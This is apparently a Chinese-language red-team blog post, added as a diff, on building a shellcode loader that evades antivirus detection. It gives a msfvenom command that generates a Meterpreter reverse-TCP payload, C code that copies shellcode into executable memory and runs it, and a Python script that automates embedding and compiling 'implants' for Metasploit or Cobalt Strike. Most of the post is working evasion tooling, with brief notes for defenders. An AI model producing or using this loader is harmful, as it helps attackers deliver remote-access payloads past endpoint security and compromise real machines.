@@ -1,0 +1,144 @@
+**Shellcode加载器是一种基本的规避技术。尽管shellcode加载器通常可以促进payload的初始执行，但是启发式检测方法仍可以标记payload的其他方面和行为。例如，很多安全产品可能会在内存中时对其进行检测，或者将特定的网络流量检测为恶意。我们将研究一些适合与加载器结合使用的后期开发框架，并研究如何嵌入其他类型的二进制文件（例如.NET和已编译的PE二进制文件）。**
+
+博客系列的第一部分将介绍使用Shellcode进行后期开发payload的基本要领。在第二部分中，我们将为加载器实现其他功能，并查看某些功能的一些优点和缺点。因为我们使用shellcode来避免基于签名的检测，所以重要的是限制安全解决方案创建启动程序签名的可能性。二进制混淆是避免基于签名的检测的一种潜在解决方案，我们将编写一个python脚本来自动化加载器的生成和混淆。
+
+##  Shellcode简介
+
+在攻击中我们需要在目标上执行某些shellcode。诸如Metasploit和Cobalt
+Strike之类的后期开发框架都有自己的shellcode，但是这些框架中的payload由于被广泛使用而具有很高的检测率。但是，它们提供了一些功能，可以让我们自由发挥。此外，使用易于检测的shellcode将有助于我们确定加载器的回避功能在开发过程中是否正常运行。
+
+Metasploit和Cobalt Strike提供both staged和stageless payload。使用both
+staged的payload时，shellcode会更小，从而导致启动程序二进制文件更小。然而，与stageless payload相比，both
+staged的payload被发现的可能更大。这可能是因为来自服务端的网络流量被标记为恶意，或者是因为检测到了攻击者用来执行最终payload的方法。在这片博客中，我们将使用stageless
+payload进行规避，因为我们不关心在将payload加载到内存之前的检测。有关both staged与stageless
+payload的更多信息，请查看[深入](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)了解无负载计量表的负载 OJ Reeves的博客文章。
+
+![](https://image.3001.net/images/20200301/1583067437_5e5bb12d050fb.png!small)
+
+上图演示了如何使用msfvenom生成原始shellcode。我们指定payload连接的IP和端口，并将输出保存到文件中。处理大文件时，该head命令只能用于打印第一个字符。在这里，我们使用该-c参数仅输出前100个字符，然后我们可以将其通过管道传递xxd以获得shellcode的十六进制转储。
+
+    
+    
+    msfvenom –p windows/meterpreter_reverse_tcp LHOST=IP LPORT=port > stageless_meterpreter.raw
+    head –c 100 stageless_meterpreter.raw | xxd
+
+TheWover
+的[Donut](https://github.com/TheWover/donut)项目可用于创建与[位置无关的shellcode](https://embeddedartistry.com/fieldmanual-terms/position-independent-code/)，该[shellcode](https://embeddedartistry.com/fieldmanual-terms/position-independent-code/)可以加载.NET，PE和DLL文件。该工具将允许我们通过支持其他payload类型来扩展加载器的可用性。使用Donut，我们可以轻松地为Mimikatz，Safetykatz和Seatbelt等工具生成shellcode。
+
+##  剖析Shellcode加载器
+
+shellcode加载器是用C编写的，我们将使用Python自动插入shellcode并编译二进制文件。要在Linux上编译Windows可执行文件，我们将使用MinGW编译器。
+
+    
+    
+    #include <stdio.h>
+    #include <windows.h>
+    using namespace std;
+    int main()
+    {
+        char shellcode[] = "把shellcode粘贴到这里";
+        LPVOID lpAlloc = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(lpAlloc, shellcode, sizeof shellcode);
+        ((void(*)())lpAlloc)();
+        return 0;
+    }
+
+在这里，我们可以看到标准shellcode加载器的源代码。在本博客系列中，我们将为该加载器添加功能。包括四个主要部分。首先，shellcode被定义为char变量，但是当前源代码具有一个占位符字符串，该字符串将在以后自动对其进行修改。然后，我们使用[VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)为shellcode分配内存。重要的是要注意，此内存页当前具有读取，写入和执行权限。之后，使用[memcpy](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019)将shellcode移到新分配的内存页面中。最后，执行shellcode。
+
+我们可以使用Msfvenom，Cobalt
+Strike和Donut生成的shellcode由原始字节组成。因为我们希望将payload嵌入到源文件中；我们必须将shellcode格式化为十六进制表示形式。可以使用手动解决方案hexdump，但是稍后我们将在Python中自动执行此步骤。
+
+![](https://image.3001.net/images/20200301/1583067437_5e5bb12d032ab.png!small)
+
+该hexdump命令将读取原始的shellcode文件并返回十六进制格式，可以将其嵌入源代码中。在上图中，我们将输出保存到文件中，然后使用该head命令来说明所返回的十六进制格式hexdump。
+
+    
+    
+    hexdump -v -e '"\\""x" 1/1 "%02x" ""' raw.bin >> hex_format
+    head –c 100 hex_format
+
+如果#replace_me#使用十六进制格式的shellcode 替换源文件中的字符串，则可以使用MinGW对其进行编译。
+
+    
+    
+    i686-w64-mingw32-c++ shellcode_launcher.cpp -o launcher.exe
+
+##  自动化
+
+尽管我们可以格式化shellcode并将其手动插入到源文件中，但是我们将编写一个简短的Python脚本来自动执行此过程。Python脚本将需要三个文件操作。它必须读取原始shellcode文件，读取源文件，然后将格式化的源代码写入文件，然后可以将其编译为最终二进制文件。
+
+    
+    
+    import binascii
+    import argparse
+    import subprocess
+    import os
+    def main(p_args):
+        # Read source template
+        with open("launcher_template.cpp", "r") as input_template:
+            source_template = input_template.read()
+        # Read input payload
+        with open(p_args.input, "rb") as input_shellcode:
+            raw_shellcode = input_shellcode.read()
+        # Convert raw binary to formatted hex
+        hex_data = binascii.hexlify(raw_shellcode).decode()
+        hex_file_content = r"\x" + r"\x".join(hex_data[n : n+2] for n in range(0, len(hex_data), 2))
+        # Insert the shellcode into the source code
+        output_file = source_template.replace("#replace_me#", hex_file_content)
+        # Write our formatted source file
+        with open("compile_me.cpp", "w") as output_handle:
+            output_handle.write(output_file)
+        # Specify our compiler arguements
+        compiler_args = []
+        compiler_args.append("i686-w64-mingw32-c++")
+        compiler_args.append("compile_me.cpp")
+        compiler_args.append("-o")
+        if len(p_args.output) > 0:
+                compiler_args.append(p_args.output)
+        else:
+                compiler_args.append("shellcode_launcher.exe")
+        # Compile the formatted source file
+        subprocess.run(compiler_args)
+        # Delete the formatted source file after it has been compiled
+        os.remove("compile_me.cpp")
+    if __name__ == "__main__":
+        parser = argparse.ArgumentParser(description='Protect your implants')
+        parser.add_argument("--input", help="Input file. Raw shellcode", type=str, required=True)
+        parser.add_argument("--output", help="Specify file output", type=str, default="")
+        args = parser.parse_args()
+        main(args)
+
+我们argparse用来确定输入文件。通过使用binascii库；我们可以不使用hexdump命令将原始shellcode转换为十六进制。当前，源模板文件的路径被硬编码到python脚本中，但是可以很容易地对其进行修改，以允许用户使用该argparse库在不同的模板之间进行选择。此外，我们可以自动编译新格式化的源文件，然后在编译完最终二进制文件后将其删除。
+
+![](https://image.3001.net/images/20200301/1583067437_5e5bb12d4dd04.png!small)
+
+##  使用x32dbg分析加载器
+
+如果我们在调试器中运行可执行文件，我们可以检查如何执行shellcode。
+
+![](https://image.3001.net/images/20200301/1583067437_5e5bb12d748d3.png!small)
+
+在上图中，我们可以看到将shellcode复制到分配的内存页后会发生什么VirtualAlloc。之后memcpy被调用时，shellcode的地址从堆栈到移动EAX寄存器。
+
+![](https://image.3001.net/images/20200301/1583067437_5e5bb12dc083c.png!small)
+
+如果我们现在看一下中的值EAX；我们可以找到shellcode所在的地址。
+
+![](https://image.3001.net/images/20200301/1583067437_5e5bb12dd1377.png!small)
+
+一旦我们有了地址；我们可以使用x32dbg中的“内存映射”标签找到内存页面。如上图所示，包含shellcode的内存页面当前具有读取，写入和执行权限。要注意的另一件事是，我们可以在中看到一个具有与payload相同大小的附加内存页面.rdata。由于shellcode是未加密地嵌入二进制文件中的，因此防御者将能够在不执行启动程序二进制文件的情况下检测到恶意负载。
+
+![](https://image.3001.net/images/20200301/1583067438_5e5bb12e442f6.png!small)
+
+使用x32dbg，蓝色团队可以查看内存页面中的内容并将其导出到文件中，以便以后进行进一步分析。对蓝色团队成员有用的注释是，即使payload在嵌入发射器二进制文件之前已被加密；通过在调试器中逐步执行，仍可以转储未加密的payload。
+
+![](https://www.nagarrosecurity.com/user/pages/05.blog/evasive-shellcode-launchers/images/after_call.PNG)
+
+如果我们继续逐步执行，我们可以看到call eax执行后，指令指针跳到了shellcode。现在，当我们正常继续执行时，我们会在Cobalt
+Strike中收到客户端连接。
+
+##  结论
+
+Msfvenom，Cobalt
+Strike和Donut使我们能够轻松支持各种不同的payload。但是，在使这些payload绕过端点安全解决方案之前，必须实现其他功能。虽然当前的加载器是基本的，但它是一个很好的基础，以后可以扩展。我们学习了如何格式化原始shellcode，以及如何将源代码编译为可执行二进制文件。另外，我们创建了一个Python脚本，该脚本可以自动完成该过程。
+
